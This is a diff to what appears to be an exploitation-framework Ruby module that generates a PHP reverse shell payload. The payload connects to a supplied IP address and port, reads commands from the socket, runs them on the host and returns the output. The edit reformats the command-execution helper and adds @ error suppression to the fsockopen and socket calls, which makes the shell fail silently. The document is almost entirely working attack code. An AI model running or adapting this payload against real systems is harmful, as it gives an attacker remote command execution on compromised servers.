@@ -73,14 +73,16 @@ module ReversePhp
 		$port=#{port};
 		#{php_preamble({:disabled_varname => "$dis"})}
 
-		if(!function_exists('myexec')){function myexec($c){
-        global$dis;
-		#{php_system_block({:cmd_varname => "$c", :disabled_varname => "$dis", :output_varname => "$o"})}
-		return$o;
-		}}
+		if(!function_exists('myexec')){
+			function myexec($c){
+				global$dis;
+				#{php_system_block({:cmd_varname => "$c", :disabled_varname => "$dis", :output_varname => "$o"})}
+				return$o;
+			}
+		}
 		$nofuncs='no exec functions';
 		if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
-			$s=fsockopen($ipaddr,$port);
+			$s=@fsockopen($ipaddr,$port);
 			while($c=fread($s,2048)){
 				$out=myexec(substr($c,0,-1));
 				if($out===false){
@@ -91,18 +93,18 @@ module ReversePhp
 			}
 			fclose($s);
 		}else{
-			$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
-			socket_connect($s,$ipaddr,$port);
-			socket_write($s,"socket_create");
-			while($c=socket_read($s,2048)){
+			$s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
+			@socket_connect($s,$ipaddr,$port);
+			@socket_write($s,"socket_create");
+			while($c=@socket_read($s,2048)){
 				$out=myexec(substr($c,0,-1));
 				if($out===false){
-					socket_write($s,$nofuncs);
+					@socket_write($s,$nofuncs);
 					break;
 				}
-				socket_write($s,$out,strlen($out));
+				@socket_write($s,$out,strlen($out));
 			}
-			socket_close($s);
+			@socket_close($s);
 		}
 		END_OF_PHP_CODE
 
